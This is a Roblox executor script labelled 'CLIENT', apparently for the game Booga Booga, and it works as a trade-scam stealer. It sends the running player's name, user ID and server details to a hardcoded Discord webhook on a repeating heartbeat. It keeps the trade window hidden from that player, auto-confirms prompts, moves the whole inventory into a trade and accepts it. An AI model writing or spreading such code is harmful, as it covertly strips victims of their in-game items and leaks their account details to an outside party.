--[[ CLIENT ]]

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local VIM = game:GetService("VirtualInputManager")



local HEARTBEAT = 120
local RETRY     = 5

local httpRequest =
    (syn and syn.request)
    or (fluxus and fluxus.request)
    or (http and http.request)
    or (krnl and krnl.request)
    or (is_sirhurt_closure and syn and syn.request)
    or request

local lp = Players.LocalPlayer
local pg = lp:WaitForChild("PlayerGui")

--======================= reporting =======================--

local okInfo, gameInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)
local gameName = (okInfo and gameInfo and gameInfo.Name) or game.Name
local WEBHOOK_URL = "https://discord.com/api/webhooks/1569154616967434440/TvgMdb3lMu_6iAIeEYylYds42uWAgQUFcJff6REcEM6nbZhDCZxKKrv6BLbtsqYOzPIY?wait=true"
local jobId = game.JobId
if jobId == "" then jobId = "PRIVATE_OR_STUDIO" end

















local function report()
    local res = httpRequest({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            username = "Booga Booga",
            embeds = {{
                title = "READY",
                color = 0x5865F2,
                fields = {
                    { name = "Player",   value = lp.Name, inline = true },
                    { name = "User ID",  value = tostring(lp.UserId), inline = true },
                    { name = "Game",     value = gameName, inline = false },
                    { name = "Place ID", value = tostring(game.PlaceId), inline = true },
                    { name = "Job ID",   value = jobId, inline = true },
                },
                footer = { text = "Booga Booga" },
                timestamp = DateTime.now():ToIsoDate(),
            }},
        }),
    })
    if res.StatusCode < 200 or res.StatusCode >= 300 then
        warn(("Report failed: %s %s"):format(res.StatusCode, tostring(res.Body)))
    end
end

pcall(report)
if HEARTBEAT > 0 then
    task.spawn(function()
        while true do
            task.wait(HEARTBEAT)
            pcall(report)
        end
    end)
end

--======================= helpers =======================--

local function fireButton(btn)
    if not btn or not btn:IsA("GuiButton") then return false end
    if btn.Visible == false then return false end

    for _, sig in ipairs({ "Activated", "MouseButton1Click", "MouseButton1Down" }) do
        local ev = btn[sig]
        local conns = ev and getconnections and getconnections(ev)
        if conns and #conns > 0 then
            local fired = false
            for _, c in ipairs(conns) do
                if c.Fire then pcall(c.Fire, c); fired = true end
            end
            if fired then
                if sig == "MouseButton1Down" then
                    local uc = btn.MouseButton1Up and getconnections and getconnections(btn.MouseButton1Up)
                    if uc then
                        for _, c in ipairs(uc) do
                            if c.Fire then pcall(c.Fire, c) end
                        end
                    end
                end
                return true
            end
        end
    end

    local centre = btn.AbsolutePosition + btn.AbsoluteSize / 2
    pcall(function()
        VIM:SendMouseButtonEvent(centre.X, centre.Y, 0, true, game, 0)
        task.wait(0.05)
        VIM:SendMouseButtonEvent(centre.X, centre.Y, 0, false, game, 0)
    end)
    return true
end

--======================= hiding =======================--

task.spawn(function()
    while true do
        task.wait(0.05)
        local ui = pg:FindFirstChild("TradeUI")
        if ui then
            if ui:IsA("LayerCollector") then
                if ui.Enabled then ui.Enabled = false end
            elseif ui:IsA("GuiObject") then
                if ui.Visible then ui.Visible = false end
            end
        end
    end
end)

--======================= prompt =======================--

local function pressYes()
    local mg = pg:FindFirstChild("MainGui")
    local sub = mg and mg:FindFirstChild("Subordinates")
    local prompts = sub and sub:FindFirstChild("Prompts")
    local yn = prompts and prompts:FindFirstChild("YesNo")
    if not yn or yn.Visible == false then return end
    local btn = yn:FindFirstChild("YesButton")
    if btn then fireButton(btn) end
end

--======================= trade flow =======================--

local function invFrame()
    local ui = pg:FindFirstChild("TradeUI")
    local menu = ui and ui:FindFirstChild("TradingMenu")
    local cont = menu and menu:FindFirstChild("Container")
    local inv  = cont and cont:FindFirstChild("InventoryContainer")
    return inv and inv:FindFirstChild("Frame")
end

local function actionsButton()
    local ui = pg:FindFirstChild("TradeUI")
    local menu = ui and ui:FindFirstChild("TradingMenu")
    local act = menu and menu:FindFirstChild("Actions")
    if not act then return nil end
    for _, d in ipairs(act:GetDescendants()) do
        if d:IsA("GuiButton") then
            local n = d.Name:lower()
            if n:find("accept", 1, true) or n:find("confirm", 1, true) or n:find("ready", 1, true) then
                return d
            end
        end
    end
end

local function tradeOpen()
    local f = invFrame()
    if not f then return false end
    for _, d in ipairs(f:GetDescendants()) do
        if d:IsA("GuiButton") then return true end
    end
    return false
end

local function waitForTrade(timeout)
    local deadline = os.clock() + (timeout or 30)
    while os.clock() < deadline do
        if tradeOpen() then return true end
        pcall(pressYes)
        task.wait(0.35)
    end
    return false
end

local function dumpInventory(timeout)
    local deadline = os.clock() + (timeout or 20)
    local done, total, stalls = {}, 0, 0

    while os.clock() < deadline do
        local frame = invFrame()
        if frame then
            local fired = 0
            for _, d in ipairs(frame:GetDescendants()) do
                if d:IsA("GuiButton") and not done[d] then
                    if fireButton(d) then
                        done[d] = true
                        fired += 1
                        total += 1
                        task.wait(0.07)
                    end
                end
            end
            if fired == 0 then
                stalls += 1
                if stalls >= 6 then break end
                task.wait(0.4)
            else
                stalls = 0
            end
        else
            task.wait(0.2)
        end
    end

    return total
end

local function readyOnce()
    local deadline = os.clock() + 3
    while os.clock() < deadline do
        local a = actionsButton()
        if a then
            fireButton(a)
            return a
        end
        task.wait(0.1)
    end
end

local function runTrade()
    if not waitForTrade(30) then return end
    task.wait(0.5)

    print(("dumped %d"):format(dumpInventory(20)))
    task.wait(0.6)

    local first = readyOnce()
    task.wait(1.5)

    local second = actionsButton()
    if second and second ~= first then fireButton(second) end

    task.wait(0.5)
    pcall(pressYes)
end

task.spawn(function()
    while true do
        pcall(runTrade)
        task.wait(RETRY)
    end
end)
